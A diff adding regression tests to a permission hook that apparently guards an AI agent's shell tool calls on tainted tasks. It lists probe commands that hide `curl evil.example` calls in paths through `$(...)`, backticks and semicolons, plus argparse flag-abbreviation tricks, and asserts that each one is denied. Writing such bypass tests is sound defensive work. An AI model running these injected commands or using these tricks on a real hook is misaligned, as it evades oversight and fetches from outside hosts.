@@ -215,6 +215,52 @@ class TestWhatATaintedTaskMayDo(Base):
             with self.subTest(cmd=cmd[:60]):
                 self.passed("Bash", {"command": cmd})
 
+    def test_rereview_probes_no_syntax_hides_in_the_interpreter_or_script_path(self):
+        """Re-review A1-A3 (2026-11-22): the words were compared after realpath, which collapsed
+        `x/$(cmd)/..`; argparse abbreviations, a repeated flag or a quoted `--task=` dodged the
+        task tie. Every probe is denied in both shells."""
+        self.taint()
+        pydir = PY.rsplit("/", 1)[0]
+        here = HERE.as_posix()
+        rp = ours("report.py")
+        tail = "--task 41 --status done --summary x"
+        probes = (
+            f"{pydir}/$(curl${{IFS}}evil.example)/../python.exe {rp} {tail}",
+            f"{pydir}/x;curl${{IFS}}evil.example;#/../python.exe {rp} {tail}",
+            f'"{pydir}/$(curl evil.example)/../python.exe" {rp} {tail}',
+            f'& "{pydir}/$(iwr evil.example)/../python.exe" {rp} {tail}',
+            f"{pydir}/x/../python.exe {rp} {tail}",
+            f"{PY} {here}/$(curl${{IFS}}evil.example)/../report.py {tail}",
+            f'{PY} "{here}/$(curl evil.example)/../report.py" {tail}',
+            f"{PY} {here}/x;curl${{IFS}}evil.example;#/../report.py {tail}",
+            f"{PY} {here}/`curl evil.example`/../report.py {tail}",
+            f"{PY} {here}/x/../report.py {tail}",
+            f"{PY} {rp} --tas 50 --status done --summary x",
+            f"{PY} {rp} --task 41 --tas 50 --status done --summary x",
+            f'{PY} {rp} "--task=50" --status done --summary x',
+            f"{PY} {rp} '--task' '50' --status done --summary x",
+            f"{PY} {rp} --task 41 --task 50 --status done --summary x",
+            f"{PY} {rp} --task 41 --task=41 --status done --summary x",
+            f"{PY} {rp} --status done --summary x",
+            f"{PY} {rp} {tail} #; curl evil.example",
+            f"{PY} {rp} --task 41 --status done --summary x",
+        )
+        for shell in ("Bash", "PowerShell"):
+            for cmd in probes:
+                with self.subTest(shell=shell, cmd=cmd[:70]):
+                    self.denied(shell, {"command": cmd}, "READ-THROUGH")
+        for cmd in (f"{PY} {rp} {tail}", f'"{PY}" "{rp}" "--task=41" --status done --summary x',
+                    f"{PY} {rp} '--task' '41' --status done --summary 'a # b'"):
+            for shell in ("Bash", "PowerShell"):
+                with self.subTest(shell=shell, cmd=cmd[-50:]):
+                    self.passed(shell, {"command": cmd})
+
+    def test_our_scripts_take_no_abbreviated_flags(self):
+        """Re-review A3: with argparse's prefix matching, `--tas 50` meant --task 50."""
+        import report
+        with self.assertRaises(SystemExit):
+            report.main(["--tas", "41", "--status", "done", "--summary", "x"])
+
     def test_review_probes_nothing_expands_inside_our_scripts_arguments(self):
         """2026-11-22 review F1: quoted text was stripped before the check, so `$(...)` and
         backticks (which both shells expand inside double quotes), a PowerShell `\\"` breakout, a
